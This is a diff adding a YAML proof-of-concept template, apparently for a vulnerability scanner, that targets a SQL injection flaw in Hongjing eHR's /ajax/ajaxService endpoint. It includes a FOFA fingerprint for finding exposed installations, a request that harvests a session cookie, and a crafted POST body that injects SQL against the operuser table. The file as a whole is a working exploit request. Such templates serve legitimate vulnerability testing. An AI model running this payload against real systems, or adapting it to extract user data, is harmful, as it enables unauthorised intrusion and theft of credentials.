@@ -1,0 +1,27 @@
+id: poc-yaml-hongjing-ehr-ajaxservice-sqli
+info:
+  name: 宏景eHR /ajax/ajaxService SQL注入漏洞复现
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: body="hjaxmanage.js" && body="/template/signature/encryptionlock/websock"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /templates/index/getpassword.jsp
+  output:
+  - regex_match(headers, "JSESSIONID=(?P<Cookie>.*?);")
+  expression: 'status_code == 200
+
+    '
+- method: POST
+  path: /ajax/ajaxService
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Cookie: JSESSIONID={{.Cookie}}
+  data: __type=extTrans&__xml={"functionId":"151211001137","sql":"select~20sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{.t1}}'))~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
+  expression: "status_code == 200 && \ncontains(body,t2)\n"
+transport: http
